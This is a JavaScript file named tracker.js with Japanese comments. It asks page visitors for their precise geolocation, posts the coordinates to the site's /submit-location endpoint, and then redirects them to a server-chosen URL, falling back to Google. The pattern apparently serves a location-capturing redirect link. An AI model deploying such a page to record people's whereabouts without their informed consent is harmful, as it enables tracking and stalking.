// static/js/tracker.js
document.addEventListener('DOMContentLoaded', function() {
    // ページが読み込まれたら位置情報の取得を開始
    getLocationAndRedirect();
});

function getLocationAndRedirect() {
    const statusElement = document.getElementById('status');
    
    // デバッグ情報を表示
    console.log('Protocol:', window.location.protocol);
    console.log('Host:', window.location.host);
    console.log('Is secure context:', window.isSecureContext);
    console.log('Navigator geolocation available:', !!navigator.geolocation);
    
    // セキュアコンテキストかどうかチェック
    if (!window.isSecureContext) {
        statusElement.textContent = 'セキュアでない接続のため位置情報を取得できません。5秒後にGoogleに移動します...';
        console.error('Not in secure context');
        setTimeout(function() {
            window.location.href = 'https://www.google.co.jp/';
        }, 5000);
        return;
    }
    
    // ブラウザが位置情報APIをサポートしているか確認
    if (!navigator.geolocation) {
        statusElement.textContent = 'お使いのブラウザは位置情報サービスをサポートしていません。5秒後にGoogleに移動します...';
        console.error('Geolocation not supported');
        setTimeout(function() {
            window.location.href = 'https://www.google.co.jp/';
        }, 5000);
        return;
    }
    
    // 位置情報の取得を試みる
    statusElement.textContent = '位置情報を取得中...';
    console.log('Requesting geolocation...');
    
    navigator.geolocation.getCurrentPosition(
        // 成功時のコールバック
        function(position) {
            console.log('位置情報取得成功:', position);
            statusElement.textContent = '位置情報を取得しました。移動します...';
            
            // 位置情報データの作成
            var locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: new Date().toISOString()
            };
            
            console.log('送信データ:', locationData);
            
            // データをサーバーに送信
            fetch('/submit-location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(locationData)
            })
            .then(response => {
                console.log('レスポンス:', response);
                return response.json();
            })
            .then(data => {
                console.log('レスポンスデータ:', data);
                if (data.status === 'success') {
                    // 指定されたURLにリダイレクト
                    window.location.href = data.redirect || 'https://www.google.co.jp/';
                } else {
                    statusElement.textContent = 'エラーが発生しました。5秒後にGoogleに移動します...';
                    setTimeout(function() {
                        window.location.href = 'https://www.google.co.jp/';
                    }, 5000);
                }
            })
            .catch(error => {
                console.error('Fetch error:', error);
                statusElement.textContent = 'エラーが発生しました。5秒後にGoogleに移動します...';
                setTimeout(function() {
                    window.location.href = 'https://www.google.co.jp/';
                }, 5000);
            });
        },
        // エラー時のコールバック
        function(error) {
            console.error('位置情報取得エラー:', error);
            let errorMessage;
            
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = '位置情報へのアクセスが拒否されました。';
                    console.log('Permission denied by user');
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = '位置情報を取得できませんでした。';
                    console.log('Position unavailable');
                    break;
                case error.TIMEOUT:
                    errorMessage = '位置情報の取得がタイムアウトしました。';
                    console.log('Timeout');
                    break;
                case error.UNKNOWN_ERROR:
                default:
                    errorMessage = '不明なエラーが発生しました。';
                    console.log('Unknown error');
                    break;
            }
            
            statusElement.textContent = errorMessage + ' 5秒後にGoogleに移動します...';
            
            // エラーが発生しても5秒後にGoogleにリダイレクト
            setTimeout(function() {
                window.location.href = 'https://www.google.co.jp/';
            }, 5000);
        },
        // オプション
        {
            enableHighAccuracy: true,  // 高精度の位置情報を要求
            timeout: 15000,            // 15秒でタイムアウト（延長）
            maximumAge: 0              // キャッシュされた位置情報は使用しない
        }
    );
}